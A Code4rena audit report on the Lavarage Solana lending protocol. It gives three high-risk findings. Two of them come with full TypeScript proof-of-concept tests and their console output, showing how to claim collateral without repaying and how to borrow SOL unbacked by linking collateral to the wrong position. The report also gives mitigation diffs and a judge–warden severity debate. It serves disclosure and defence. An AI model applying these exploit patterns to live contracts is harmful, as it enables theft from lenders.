---
sponsor: "Lavarage"
slug: "2024-04-lavarage"
date: "2024-05-29"
title: "Lavarage Invitational"
findings: "https://github.com/code-423n4/2024-04-lavarage-findings/issues"
contest: 362
---

# Overview

## About C4

Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.

A C4 audit is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.

During the audit outlined in this document, C4 conducted an analysis of the Lavarage smart contract system written in Rust. The audit took place between April 11 — April 29, 2024.

## Wardens

In Code4rena's Invitational audits, the competition is limited to a small group of wardens; for this audit, 5 wardens contributed reports:

  1. [Koolex](https://code4rena.com/@Koolex)
  2. [Arabadzhiev](https://code4rena.com/@Arabadzhiev)
  3. [DadeKuma](https://code4rena.com/@DadeKuma)
  4. [rvierdiiev](https://code4rena.com/@rvierdiiev)
  5. [adeolu](https://code4rena.com/@adeolu)

This audit was judged by [alcueca](https://code4rena.com/@alcueca).

Final report assembled by [thebrittfactor](https://twitter.com/brittfactorC4).

# Summary

The C4 analysis yielded an aggregated total of 7 unique vulnerabilities. Of these vulnerabilities, 3 received a risk rating in the category of HIGH severity and 4 received a risk rating in the category of MEDIUM severity.

Additionally, C4 analysis included 5 reports detailing issues with a risk rating of LOW severity or non-critical.

All of the issues presented here are linked back to their original finding.

# Scope

The code under review can be found within the C4 Lavarage repository*, and is composed of 17 smart contracts written in the Rust programming language and includes 730 lines of Rust code.

**Note: The sponsor team requested to leave the main audit repo private. All links to the main audit repo have been removed.*

# Severity Criteria

C4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.

High-level considerations for vulnerabilities span the following key areas when conducting assessments:

- Malicious Input Handling
- Escalation of privileges
- Arithmetic
- Gas use

For more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on [the C4 website](https://code4rena.com), specifically our section on [Severity Categorization](https://docs.code4rena.com/awarding/judging-criteria/severity-categorization).

# High Risk Findings (3)

## [[H-01] Collateral can be claimed back without repaying its corresponding loan due to insufficient instruction validation](https://github.com/code-423n4/2024-04-lavarage-findings/issues/26)
*Submitted by [Arabadzhiev](https://github.com/code-423n4/2024-04-lavarage-findings/issues/26), also found by [Koolex](https://github.com/code-423n4/2024-04-lavarage-findings/issues/13)*

Users can bypass the repayment of their loans when claiming their collateral, which can be abused in order to drain any trading pool.

### Proof of Concept

The `borrow_collateral` function located inside the `swapback.rs` file lacks a crucial instruction validation check - a check for verifying that the `random_account_as_id` value passed into the `repay_sol` instruction context is not the same as that passed into the `borrow_collateral` instruction context. What this effectively means is that users can pass in an instruction that calls `repay_sol` with a `position_account` value that is different than the one passed into `borrow_collateral`. This can be abused in order to claim the collateral for one position, while repaying the borrowed SOL for another (even if that one was already repaid), making it possible to claim back collateral while repaying practically nothing, if the repayed position is one with a dust amount borrowed.

The following coded PoC demonstrates the issue at question. To run it, paste it at the bottom of the `lavarage` describe block in the `lavarage.spec.ts` test file and then run `anchor test` in `libs/smart-contracts`. The tests inside `lavarage.spec.ts` are stateful, so the order in which they are executed does matter.

<details>

```ts
it('Should allow claiming collateral without repaying the loan', async () => {
    const randomAccountSeed1 = Keypair.generate();
    const randomAccountSeed2 = Keypair.generate();

    const tradingPool = getPDA(program.programId, [
      Buffer.from('trading_pool'),
      provider.publicKey.toBuffer(),
      tokenMint.toBuffer(),
    ]);
    // increase max borrow to 1 SOL so that we don't have to mint more tokens
    await program.methods
      .lpOperatorUpdateMaxBorrow(new anchor.BN(1000000000))
      .accountsStrict({
        tradingPool,
        nodeWallet: nodeWallet.publicKey,
        operator: provider.publicKey,
        systemProgram: anchor.web3.SystemProgram.programId,
      })
      .rpc();

    await program.methods
      .lpOperatorFundNodeWallet(new anchor.BN(5000000000))
      .accounts({
        nodeWallet: nodeWallet.publicKey,
        systemProgram: anchor.web3.SystemProgram.programId,
        funder: program.provider.publicKey,
      })
      .rpc();

    const traderBalanceBefore = await provider.connection.getBalance(
      provider.publicKey,
    );

    const positionAccount = getPDA(program.programId, [
      Buffer.from('position'),
      provider.publicKey?.toBuffer(),
      tradingPool.toBuffer(),
      randomAccountSeed1.publicKey.toBuffer(),
    ]);
    const positionATA = await getOrCreateAssociatedTokenAccount(
      provider.connection,
      anotherPerson,
      tokenMint,
      positionAccount,
      true,
    );

    // opening a first very small borrow position that we will use for callig `add_collateral` with for the second
    const borrowIx1 = await program.methods
      .tradingOpenBorrow(new anchor.BN(5), new anchor.BN(4))
      .accountsStrict({
        positionAccount,
        trader: provider.publicKey,
        tradingPool,
        nodeWallet: nodeWallet.publicKey,
        randomAccountAsId: randomAccountSeed1.publicKey,
        // frontend fee receiver. could be any address. opening fee 0.5%
        feeReceipient: anotherPerson.publicKey,
        systemProgram: anchor.web3.SystemProgram.programId,
        clock: anchor.web3.SYSVAR_CLOCK_PUBKEY,
        instructions: anchor.web3.SYSVAR_INSTRUCTIONS_PUBKEY,
      })
      .instruction();
    const transferIx1 = createTransferCheckedInstruction(
      userTokenAccount.address,
      tokenMint,
      positionATA.address,
      provider.publicKey,
      100000000,
      9,
    );
    const addCollateralIx1 = await program.methods
      .tradingOpenAddCollateral()
      .accountsStrict({
        positionAccount,
        tradingPool,
        systemProgram: anchor.web3.SystemProgram.programId,
        trader: provider.publicKey,
        randomAccountAsId: randomAccountSeed1.publicKey,
        mint: tokenMint,
        toTokenAccount: positionATA.address,
      })
      .instruction();
    const receiveCollateralIx1 = await program.methods
      .tradingCloseBorrowCollateral()
      .accountsStrict({
        positionAccount,
        trader: provider.publicKey,
        tradingPool,
        instructions: SYSVAR_INSTRUCTIONS_PUBKEY,
        systemProgram: anchor.web3.SystemProgram.programId,
        clock: SYSVAR_CLOCK_PUBKEY,
        randomAccountAsId: randomAccountSeed1.publicKey,
        mint: tokenMint,
        toTokenAccount: userTokenAccount.address,
        fromTokenAccount: positionATA.address,
        tokenProgram: TOKEN_PROGRAM_ID,
      })
      .instruction();
    const repaySOLIx1 = await program.methods
      .tradingCloseRepaySol(new anchor.BN(0), new anchor.BN(9997))
      .accountsStrict({
        positionAccount,
        trader: provider.publicKey,
        tradingPool,
        nodeWallet: nodeWallet.publicKey,
        systemProgram: anchor.web3.SystemProgram.programId,
        clock: SYSVAR_CLOCK_PUBKEY,
        randomAccountAsId: randomAccountSeed1.publicKey,
        feeReceipient: anotherPerson.publicKey,
      })
      .instruction();

    const tx1 = new Transaction()
      .add(borrowIx1)
      .add(transferIx1)
      .add(addCollateralIx1)
      .add(receiveCollateralIx1)
      .add(repaySOLIx1);
    await provider.sendAll([{ tx: tx1 }]);

    const positionAccount2 = getPDA(program.programId, [
      Buffer.from('position'),
      provider.publicKey?.toBuffer(),
      tradingPool.toBuffer(),
      randomAccountSeed2.publicKey.toBuffer(),
    ]);
    const positionATA2 = await getOrCreateAssociatedTokenAccount(
      provider.connection,
      anotherPerson,
      tokenMint,
      positionAccount2,
      true,
    );

    // second borrow ix that borrows an actual meaningful amount of SOL
    const actualBorrowAmount = 50000000;
    const borrowIx2 = await program.methods
      .tradingOpenBorrow(
        new anchor.BN(actualBorrowAmount + 10000000),
        new anchor.BN(10000000),
      )
      .accountsStrict({
        positionAccount: positionAccount2,
        trader: provider.publicKey,
        tradingPool,
        nodeWallet: nodeWallet.publicKey,
        randomAccountAsId: randomAccountSeed2.publicKey,
        feeReceipient: anotherPerson.publicKey,
        systemProgram: anchor.web3.SystemProgram.programId,
        clock: anchor.web3.SYSVAR_CLOCK_PUBKEY,
        instructions: anchor.web3.SYSVAR_INSTRUCTIONS_PUBKEY,
      })
      .instruction();
    const transferIx2 = createTransferCheckedInstruction(
      userTokenAccount.address,
      tokenMint,
      positionATA2.address,
      provider.publicKey,
      10000000000,
      9,
    );
    const addCollateralIx2 = await program.methods
      .tradingOpenAddCollateral()
      .accountsStrict({
        positionAccount: positionAccount2,
        tradingPool,
        systemProgram: anchor.web3.SystemProgram.programId,
        trader: provider.publicKey,
        randomAccountAsId: randomAccountSeed2.publicKey,
        mint: tokenMint,
        toTokenAccount: positionATA2.address,
      })
      .instruction();
    const receiveCollateralIx2 = await program.methods
      .tradingCloseBorrowCollateral()
      .accountsStrict({
        positionAccount: positionAccount2,
        trader: provider.publicKey,
        tradingPool,
        instructions: SYSVAR_INSTRUCTIONS_PUBKEY,
        systemProgram: anchor.web3.SystemProgram.programId,
        clock: SYSVAR_CLOCK_PUBKEY,
        randomAccountAsId: randomAccountSeed2.publicKey,
        mint: tokenMint,
        toTokenAccount: userTokenAccount.address,
        fromTokenAccount: positionATA2.address,
        tokenProgram: TOKEN_PROGRAM_ID,
      })
      .instruction();
    const tx2 = new Transaction()
      .add(borrowIx2)
      .add(transferIx2)
      .add(addCollateralIx2)
      .add(receiveCollateralIx2)
      .add(repaySOLIx1); // reuseing the first repay ix, which effectively means that we are going to repay
    // for the first possition a second time instead of the current one being closed
    await provider.sendAll([{ tx: tx2 }]);

    const traderBalanceAfter = await provider.connection.getBalance(
      provider.publicKey,
    );
    const traderBalanceGains = traderBalanceAfter - traderBalanceBefore;

    console.log('traderBalanceBefore: ', traderBalanceBefore);
    console.log('traderBalanceAfter: ', traderBalanceAfter);
    console.log('traderBalanceGains: ', traderBalanceGains);

    expect(traderBalanceGains).toBeGreaterThan(actualBorrowAmount * 0.9); // approximate the gains due to fee deductions
});
```

</details>

### Recommended Mitigation Steps

Replace the current verification checks with a single one for the `position_account` value:

```diff
    if ix_discriminator == crate::instruction::TradingCloseRepaySol::DISCRIMINATOR {
-                   require_keys_eq!(
-                       ix.accounts[2].pubkey,
-                       ctx.accounts.trading_pool.key(),
-                       FlashFillError::IncorrectProgramAuthority
-                   );
-                   require_keys_eq!(
-                       ix.accounts[1].pubkey,
-                       ctx.accounts.trader.key(),
-                       FlashFillError::IncorrectProgramAuthority
-                   );
-                   require_keys_eq!(
-                       ctx.accounts.position_account.trader.key(),
-                       ctx.accounts.trader.key(),
-                       FlashFillError::IncorrectProgramAuthority
-                   );
-                   require_keys_eq!(
-                       ctx.accounts.position_account.pool.key(),
-                       ctx.accounts.trading_pool.key(),
-                       FlashFillError::IncorrectProgramAuthority
-                   );
+                   require_keys_eq!(
+                       ix.accounts[0].pubkey,
+                       ctx.accounts.position_account.key(),
+                       FlashFillError::IncorrectProgramAuthority
+                   );
                    ...
    }
```

### Assessed type

Invalid Validation

**[piske-alex (Lavarage) confirmed](https://github.com/code-423n4/2024-04-lavarage-findings/issues/26#issuecomment-2088621340)**

***

## [[H-02] A borrower can borrow SOL without backing it by a collateral](https://github.com/code-423n4/2024-04-lavarage-findings/issues/16)
*Submitted by [Koolex](https://github.com/code-423n4/2024-04-lavarage-findings/issues/16), also found by [Arabadzhiev](https://github.com/code-423n4/2024-04-lavarage-findings/issues/28) and [rvierdiiev](https://github.com/code-423n4/2024-04-lavarage-findings/issues/4)*

The borrower can borrow SOL from the lender without backing it by a collateral. This is possible because the borrower can open two positions at the same time (same TX) but link both `addCollateral` to one position. Although `borrow` checks the existence of `addCollateral`, it doesn't check if the positions match.

This can be done as follows:

1. The borrower opens two positions (`Pos#1` and `Pos#2`).
2. When opening the position, the borrower links both collateral to `Pos#1`.
3. The borrower repays `Pos#1.borrowed`, Thus, withdrawing both collaterals.
4. Now, the protocol has no collaterals.
5. The borrower got away with `Pos#2.borrowed` without adding a collateral.

Check the PoC below, It demonstrates how a thief could perform the scenario above.

### Proof of Concept

Please create a file  `tests/poc_extract_col_and_sol_lavarage.spec.ts`) , then run the following command:

    ```sh
    ORACLE_PUB_KEY=ATeSYS4MQUs2d6UQbBvs9oSNvrmNPU1ibnS2Dmk21BKZ anchor test
    ```

You should see the following output:

<details>

    ```sh
      console.log
    	===== Initial Amounts======

    	  at tests/poc_extract_col_and_sol_lavarage.spec.ts:311:13

      console.log
    	Pos#1.collateral    :  0n

    	  at tests/poc_extract_col_and_sol_lavarage.spec.ts:313:13

      console.log
    	Pos#2.collateral    :  0n

    	  at tests/poc_extract_col_and_sol_lavarage.spec.ts:314:13

      console.log
    	Borrower Collateral :  200000000000000000n

    	  at tests/poc_extract_col_and_sol_lavarage.spec.ts:315:13

      console.log
    	Node Sol            :  500001294560

    	  at tests/poc_extract_col_and_sol_lavarage.spec.ts:317:13

      console.log
    	Borrower Sol        :  499999499996989200

    	  at tests/poc_extract_col_and_sol_lavarage.spec.ts:318:13

      console.log
    	===== After Borrow #1 and #2======

    	  at tests/poc_extract_col_and_sol_lavarage.spec.ts:335:13

      console.log
    	Pos#1.collateral    :  200000000000000000n

    	  at tests/poc_extract_col_and_sol_lavarage.spec.ts:355:13

      console.log
    	Pos#2.collateral    :  0n

    	  at tests/poc_extract_col_and_sol_lavarage.spec.ts:356:13

      console.log
    	Borrower Collateral :  0n

    	  at tests/poc_extract_col_and_sol_lavarage.spec.ts:357:13

      console.log
    	Node Sol            :  495001294555

    	  at tests/poc_extract_col_and_sol_lavarage.spec.ts:361:13

      console.log
    	Borrower Sol        :  499999504967724700

    	  at tests/poc_extract_col_and_sol_lavarage.spec.ts:362:13

      console.log
    	>>===== Now, repay borrow#1 only and withdraw all of my collaterals======>>

    	  at tests/poc_extract_col_and_sol_lavarage.spec.ts:400:13

      console.log
    	===== After Successful Repay ======

    	  at tests/poc_extract_col_and_sol_lavarage.spec.ts:404:13

      console.log
    	Pos#1.collateral    :  0n

    	  at tests/poc_extract_col_and_sol_lavarage.spec.ts:422:13

      console.log
    	Pos#2.collateral    :  0n

    	  at tests/poc_extract_col_and_sol_lavarage.spec.ts:423:13

      console.log
    	Borrower Collateral :  200000000000000000n

    	  at tests/poc_extract_col_and_sol_lavarage.spec.ts:424:13

      console.log
    	Node Sol            :  495001294560

    	  at tests/poc_extract_col_and_sol_lavarage.spec.ts:428:13

      console.log
    	Borrower Sol        :  499999504967719600

    	  at tests/poc_extract_col_and_sol_lavarage.spec.ts:429:13

     PASS  tests/poc_extract_col_and_sol_lavarage.spec.ts (7.679 s)
      lavarage
    	✓ Should mint new token! (1849 ms)
    	✓ Should create lpOperator node wallet (451 ms)
    	✓ Should create trading pool (454 ms)
    	✓ Should fund node wallet (463 ms)
    	✓ Should set maxBorrow (455 ms)
    	✓ Hacker can extract SOL and Collaterl (1842 ms)

    Test Suites: 1 passed, 1 total
    Tests:       6 passed, 6 total
    Snapshots:   0 total
    Time:        7.749 s
    Ran all test suites.
    ```

</details>

**Summary of balances:**
- Before the attack
  - Lender SOL => 500.001294560
  - Lender Collateral `Pos#1` => 0
  - Lender Collateral `Pos#2` => 0
  - Borrower SOL => 499999499.996989200
  - Borrower Collateral => 200000000.000000000
- After borrowing (Notice that `Pos#2` has no collateral)
  - Lender SOL => 495.001294555
  - Lender Collateral `Pos#1` => 200000000.000000000
  - Lender Collateral `Pos#2` => 0
  - Borrower SOL => 499999504.967724700
  - Borrower Collateral => 0
- After repay
  - Lender SOL => 495.001294560
  - Lender Collateral `Pos#1` => 0
  - Lender Collateral `Pos#2` => 0
  - Borrower SOL => 499999504.967719600
  - Borrower Collateral => 200000000.000000000

Test file:

<details>

```typescript
import * as anchor from '@coral-xyz/anchor';
import {
  Keypair,
  PublicKey,
  Signer,
  SystemProgram,
  SYSVAR_CLOCK_PUBKEY,
  SYSVAR_INSTRUCTIONS_PUBKEY,
  Transaction,
} from '@solana/web3.js';
import { Lavarage } from '../target/types/lavarage';

import {
  createMint,
  createTransferCheckedInstruction,
  getAccount,
  getOrCreateAssociatedTokenAccount,
  mintTo,
  TOKEN_PROGRAM_ID,
} from '@solana/spl-token';
import { web3 } from '@coral-xyz/anchor';
export function getPDA(programId, seed) {
  const seedsBuffer = Array.isArray(seed) ? seed : [seed];

  return web3.PublicKey.findProgramAddressSync(seedsBuffer, programId)[0];
}
describe('lavarage', () => {
  anchor.setProvider(anchor.AnchorProvider.env());
  const program: anchor.Program<Lavarage> = anchor.workspace.Lavarage;
  const nodeWallet = anchor.web3.Keypair.generate();
  const anotherPerson = anchor.web3.Keypair.generate();
  const seed = anchor.web3.Keypair.generate();
  // TEST ONLY!!! DO NOT USE!!!
  const oracleKeyPair = anchor.web3.Keypair.fromSecretKey(
    Uint8Array.from([
      70, 207, 196, 18, 254, 123, 0, 205, 199, 137, 184, 9, 156, 224, 62, 74,
      209, 0, 80, 73, 146, 151, 175, 68, 182, 180, 53, 91, 214, 7, 167, 209,
      140, 140, 158, 10, 59, 141, 76, 114, 109, 208, 44, 110, 77, 64, 149, 121,
      7, 226, 125, 0, 105, 29, 76, 131, 99, 95, 123, 206, 81, 5, 198, 140,
    ]),
  );
  let tokenMint;
  let userTokenAccount;

  let tokenMint2;
  let userTokenAccount2;


  const provider = anchor.getProvider();

  async function mintMockTokens(
    people: Signer,
    provider: anchor.Provider,
    amount: number,
  ): Promise<any> {
    const connection = provider.connection;

    const signature = await connection.requestAirdrop(
      people.publicKey,
      2000000000,
    );
    await connection.confirmTransaction(signature, 'confirmed');

    // Create a new mint
    const mint = await createMint(
      connection,
      people,
      people.publicKey,
      null,
      9, // Assuming a decimal place of 9
    );

    // Get or create an associated token account for the recipient
    const recipientTokenAccount = await getOrCreateAssociatedTokenAccount(
      connection,
      people,
      mint,
      provider.publicKey,
    );

    // Mint new tokens to the recipient's token account
    await mintTo(
      connection,
      people,
      mint,
      recipientTokenAccount.address,
      people,
      amount,
    );

    return {
      mint,
      recipientTokenAccount,
    };
  }

  // Setup phase
  it('Should mint new token!', async () => {
    const { mint, recipientTokenAccount } = await mintMockTokens(
      anotherPerson,
      provider,
      200000000000000000,
      // 200000000000,
    );
    tokenMint = mint;
    userTokenAccount = recipientTokenAccount;
  }, 20000);



  it('Should create lpOperator node wallet', async () => {
    await program.methods
      .lpOperatorCreateNodeWallet()
      .accounts({
        nodeWallet: nodeWallet.publicKey,
        systemProgram: anchor.web3.SystemProgram.programId,
        operator: program.provider.publicKey,
      })
      .signers([nodeWallet])
      .rpc();
  });

  it('Should create trading pool', async () => {
    const tradingPool = getPDA(program.programId, [
      Buffer.from('trading_pool'),
      provider.publicKey.toBuffer(),
      tokenMint.toBuffer(),
    ]);
    await program.methods
      .lpOperatorCreateTradingPool(50)
      .accounts({
        nodeWallet: nodeWallet.publicKey,
        systemProgram: anchor.web3.SystemProgram.programId,
        operator: program.provider.publicKey,
        tradingPool,
        mint: tokenMint,
      })
      .rpc();
  });

  
  it('Should fund node wallet', async () => {
    await program.methods
      .lpOperatorFundNodeWallet(new anchor.BN(500000000000))
      .accounts({
        nodeWallet: nodeWallet.publicKey,
        systemProgram: anchor.web3.SystemProgram.programId,
        funder: program.provider.publicKey,
      })
      .rpc();
  });

  it('Should set maxBorrow', async () => {
    const tradingPool = getPDA(program.programId, [
      Buffer.from('trading_pool'),
      provider.publicKey.toBuffer(),
      tokenMint.toBuffer(),
    ]);
    // X lamports per 1 Token
    await program.methods
      .lpOperatorUpdateMaxBorrow(new anchor.BN(50))
      .accountsStrict({
        tradingPool,
        nodeWallet: nodeWallet.publicKey,
        operator: provider.publicKey,
        systemProgram: anchor.web3.SystemProgram.programId,
      })
      .rpc();
  });

  // repay
  it('Hacker can extract SOL and Collaterl', async () => {
    //
    const seed = Keypair.generate();
    const seed2 = Keypair.generate();

    const tradingPool = getPDA(program.programId, [
      Buffer.from('trading_pool'),
      provider.publicKey.toBuffer(),
      tokenMint.toBuffer(),
    ]);
    // create ATA for position account
    const positionAccount = getPDA(program.programId, [
      Buffer.from('position'),
      provider.publicKey?.toBuffer(),
      tradingPool.toBuffer(),
      // unique identifier for the position
      seed.publicKey.toBuffer(),
    ]);
    const positionATA = await getOrCreateAssociatedTokenAccount(
      provider.connection,
      anotherPerson,
      tokenMint,
      positionAccount,
      true,
    );

    // create ATA for position account 2
    const positionAccount2 = getPDA(program.programId, [
      Buffer.from('position'),
      provider.publicKey?.toBuffer(),
      tradingPool.toBuffer(),
      // unique identifier for the position
      seed2.publicKey.toBuffer(),
    ]);
    const positionATA2 = await getOrCreateAssociatedTokenAccount(
      provider.connection,
      anotherPerson,
      tokenMint,
      positionAccount2,
      true,
    );


    // actual borrow
    const borrowIx = await program.methods
    .tradingOpenBorrow(new anchor.BN(10), new anchor.BN(5))
      .accountsStrict({
        positionAccount,
        trader: provider.publicKey,
        tradingPool,
        nodeWallet: nodeWallet.publicKey,
        randomAccountAsId: seed.publicKey,
        // frontend fee receiver. could be any address. opening fee 0.5%
        feeReceipient: anotherPerson.publicKey,
        systemProgram: anchor.web3.SystemProgram.programId,
        clock: anchor.web3.SYSVAR_CLOCK_PUBKEY,
        instructions: anchor.web3.SYSVAR_INSTRUCTIONS_PUBKEY,
      })
      .instruction();

      const transferIx = createTransferCheckedInstruction(
        userTokenAccount.address,
        tokenMint,
        positionATA.address,
        provider.publicKey,
        100000000000000000,
        9,
      );

    const transferIx2 = createTransferCheckedInstruction(
      userTokenAccount.address,
      tokenMint,
      positionATA.address, // transfer to the other account (1st pos)
      provider.publicKey,
      100000000000000000,
      9,
    );
    // the param in this method is deprecated. should be removed.
    const addCollateralIx = await program.methods
      .tradingOpenAddCollateral()
      .accountsStrict({
        positionAccount,
        tradingPool,
        systemProgram: anchor.web3.SystemProgram.programId,
        trader: provider.publicKey,
        randomAccountAsId: seed.publicKey,
        mint: tokenMint,
        toTokenAccount: positionATA.address, // I need to create this account
      })
      .instruction();


    // actual borrow 2
    const borrowIx2 = await program.methods
    .tradingOpenBorrow(new anchor.BN(10000000000), new anchor.BN(5000000000))
    .accountsStrict({
      positionAccount: positionAccount2,
      trader: provider.publicKey,
      tradingPool,
      nodeWallet: nodeWallet.publicKey,
      randomAccountAsId: seed2.publicKey,
      // frontend fee receiver. could be any address. opening fee 0.5%
      feeReceipient: anotherPerson.publicKey,
      systemProgram: anchor.web3.SystemProgram.programId,
      clock: anchor.web3.SYSVAR_CLOCK_PUBKEY,
      instructions: anchor.web3.SYSVAR_INSTRUCTIONS_PUBKEY,
    })
    .instruction();

    // the param in this method is deprecated. should be removed.
    const addCollateralIx2 = await program.methods
    .tradingOpenAddCollateral()
    .accountsStrict({
      positionAccount: positionAccount,
      tradingPool,
      systemProgram: anchor.web3.SystemProgram.programId,
      trader: provider.publicKey,
      randomAccountAsId: seed.publicKey,
      mint: tokenMint,
      toTokenAccount: positionATA.address,
    })
    .instruction();


    let tokenAccount = await getAccount(
      provider.connection,
      positionATA.address,
    );

    let tokenAccount2 = await getAccount(
      provider.connection,
      positionATA2.address,
    );

    let userTokenAcc = await getAccount(
      provider.connection,
      userTokenAccount.address,
    );

    console.log("===== Initial Amounts======");

    console.log("Pos#1.collateral    : ", tokenAccount.amount);
    console.log("Pos#2.collateral    : ", tokenAccount2.amount);
    console.log("Borrower Collateral : ", userTokenAcc.amount);

    console.log("Node Sol            : ", await provider.connection.getBalance(nodeWallet.publicKey));
    console.log("Borrower Sol        : ", await provider.connection.getBalance(provider.publicKey));
    

    const tx_borrow = new Transaction()
    .add(borrowIx)
    .add(transferIx)
    .add(addCollateralIx)
    .add(borrowIx2)
    .add(transferIx2)
    .add(addCollateralIx2); // add collateral but link it to first Pos




    await provider.sendAll([{ tx: tx_borrow }]);


    console.log("===== After Borrow #1 and #2======");
     
    tokenAccount = await getAccount(
      provider.connection,
      positionATA.address,
    );
     
    tokenAccount2 = await getAccount(
      provider.connection,
      positionATA2.address,
    );


     userTokenAcc = await getAccount(
      provider.connection,
      userTokenAccount.address,
    );

    const tokenAccount_amount = tokenAccount.amount;
    const userTokenAcc_amount = userTokenAcc.amount;
    console.log("Pos#1.collateral    : ", tokenAccount_amount);
    console.log("Pos#2.collateral    : ", tokenAccount2.amount);
    console.log("Borrower Collateral : ", userTokenAcc_amount);

    const node_balance = await provider.connection.getBalance(nodeWallet.publicKey);
    const user_balance = await provider.connection.getBalance(provider.publicKey);
    console.log("Node Sol            : ", node_balance);
    console.log("Borrower Sol        : ", user_balance);


    const receiveCollateralIx = await program.methods
    .tradingCloseBorrowCollateral()
    .accountsStrict({
      positionAccount: positionAccount,  
      trader: provider.publicKey,
      tradingPool,
      instructions: SYSVAR_INSTRUCTIONS_PUBKEY,
      systemProgram: anchor.web3.SystemProgram.programId,
      clock: SYSVAR_CLOCK_PUBKEY,
      randomAccountAsId: seed.publicKey,  
      mint: tokenMint,
      toTokenAccount: userTokenAccount.address,
      fromTokenAccount: positionATA.address,
      tokenProgram: TOKEN_PROGRAM_ID,
    })
    .instruction();
  const repaySOLIx = await program.methods
    // .tradingCloseRepaySol(new anchor.BN(20000), new anchor.BN(9998))
    .tradingCloseRepaySol(new anchor.BN(0), new anchor.BN(9998))
    .accountsStrict({
      positionAccount: positionAccount,
      trader: provider.publicKey,
      tradingPool,
      nodeWallet: nodeWallet.publicKey,
      systemProgram: anchor.web3.SystemProgram.programId,
      clock: SYSVAR_CLOCK_PUBKEY,
      randomAccountAsId: seed.publicKey,
      feeReceipient: anotherPerson.publicKey,
    })
    .instruction();
    
    const tx_repay = new Transaction()
    .add(receiveCollateralIx)
    .add(repaySOLIx);

    console.log(">>===== Now, repay borrow#1 only and withdraw all of my collaterals======>>");

    await provider.sendAll([{ tx: tx_repay }]);

    console.log("===== After Successful Repay ======");

    tokenAccount = await getAccount(
      provider.connection,
      positionATA.address,
    );

    tokenAccount2 = await getAccount(
      provider.connection,
      positionATA2.address,
    );

     userTokenAcc = await getAccount(
      provider.connection,
      userTokenAccount.address,
    );
    const tokenAccount_amount2 = tokenAccount.amount;
    const userTokenAcc_amount2 = userTokenAcc.amount;
    console.log("Pos#1.collateral    : ", tokenAccount_amount2);
    console.log("Pos#2.collateral    : ", tokenAccount2.amount);
    console.log("Borrower Collateral : ", userTokenAcc_amount2);

    const node_balance2 = await provider.connection.getBalance(nodeWallet.publicKey);
    const user_balance2 = await provider.connection.getBalance(provider.publicKey);
    console.log("Node Sol            : ", node_balance2);
    console.log("Borrower Sol        : ", user_balance2);


  });

});
```

</details>

### Recommended Mitigation Steps

On `borrow` validate that the `TradingOpenAddCollateral` has the relevant position account.

### Assessed type

Invalid Validation

**[piske-alex (Lavarage) confirmed](https://github.com/code-423n4/2024-04-lavarage-findings/issues/16#issuecomment-2088629427)**

***

## [[H-03] Malicious borrowers will never repay loans with high interest](https://github.com/code-423n4/2024-04-lavarage-findings/issues/10)
*Submitted by [DadeKuma](https://github.com/code-423n4/2024-04-lavarage-findings/issues/10), also found by [DadeKuma](https://github.com/code-423n4/2024-04-lavarage-findings/issues/9) and [Arabadzhiev](https://github.com/code-423n4/2024-04-lavarage-findings/issues/23)*

Borrowers have no incentives to repay the loan if the owed interest grows too much, as the liquidation check fails to take it into consideration when calculating the LTV. This will generate bad debt for the lenders.

### Proof of Concept

The liquidation call must pass this check to execute:

```rust
require!(ctx.accounts.position_account.amount * 1000 / position_size  > 900, FlashFillError::ExpectedCollateralNotEnough );
```

`src/processor/liquidate.rs#L27`

The issue is that it fails to consider how much interest is owed by the borrower, it only checks how much the user has borrowed at the start of the loan:

```rust
ctx.accounts.position_account.amount = position_size - user_pays;
```

`src/processor/swap.rs#L16`

As such, if the borrower accumulates a very high interest to pay, the lender has no way to liquidate this position if the original borrowed amount's LTV (without accrued interest) stays under 90%. These borrowers will never repaid the loan, and this will generate bad debt for lenders.

### Recommended Mitigation Steps

Consider adding the owed interest to the total amount when performing the liquidation check.

### Assessed type

Invalid Validation

**[piske-alex (Lavarage) confirmed](https://github.com/code-423n4/2024-04-lavarage-findings/issues/10#issuecomment-2087753883)**

**[alcueca (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-04-lavarage-findings/issues/10#issuecomment-2105095328):**
 > Downgraded to Medium because even if borrowers can effectively steal the borrowed amount, to do so they need to keep an amount of collateral of higher value locked in the protocol.

**[DadeKuma (warden) commented](https://github.com/code-423n4/2024-04-lavarage-findings/issues/10#issuecomment-2105127167):**
 > @alcueca - I disagree, as this clearly warrants High severity if we follow the severity categorization. There are zero hypotheticals, any borrower can get a loan for an unlimited amount of time (and not pay ANY interest), without consequences.
> 
> It's like saying that I go to the bank to get a loan, never pay the interest (without consequences), and they can't liquidate me until the collateral I provided is worthless. The bank is experiencing a loss of funds because it is lending money for free.

**[alcueca (judge) commented](https://github.com/code-423n4/2024-04-lavarage-findings/issues/10#issuecomment-2105137020):**
 > The attacker is experiencing a larger loss of funds, which makes it a grieving attack, which is Medium.

**[DadeKuma (warden) commented](https://github.com/code-423n4/2024-04-lavarage-findings/issues/10#issuecomment-2105164983):**
 > @alcueca - Consider the following case. The lender lends 1000 SOL with a 10% monthly rate. Let's say that the collateral is worth 1500 SOL. 
> 
> Every month, the borrower should pay 100 SOL, but they can ignore the payments without consequences.
> 
> After 6 months, the lender has lost more funds than the borrower (they should have earned 600 SOL but they have earned `0`), and they can't do anything to claim the collateral, they are lending money for free. But they are forced to wait until the collateral is worthless.
> 
> Consequences:
> 1. Lenders miss interest payments, potentially forever.
> 2. Meanwhile, they can't offer new loans, as their funds are already locked in this one.
> 3. The protocol is useless if no one repays their loans as lenders only lose money.
> 4. If accrued interest is higher than collateral, the borrower will never repay, because at this point the liquidation costs less than the repayment.
> 
> The lender is accruing [bad debt](https://www.investopedia.com/terms/b/baddebt.asp), which is a clear loss of funds for the lender. Recouping the collateral is not enough if their funds stay locked for decades.

**[alcueca (judge) commented](https://github.com/code-423n4/2024-04-lavarage-findings/issues/10#issuecomment-2112823443):**
 > When measuring financial losses it is uncommon to consider loss of future income or opportunity cost. I see this vulnerability as the victim putting X assets into the protocol, and the attacker spending Y assets so that the victim loses theirs, with the value of Y greater than the value of X.
> 
> If the victim would have put their assets somewhere expecting 0% income, for example, in an escrow contract, and they would get locked in the same fashion, you could still make the reasoning that because the victim has been blocked from withdrawing and earning an income on their assets in perpetuity, the issue is a critical.
> 
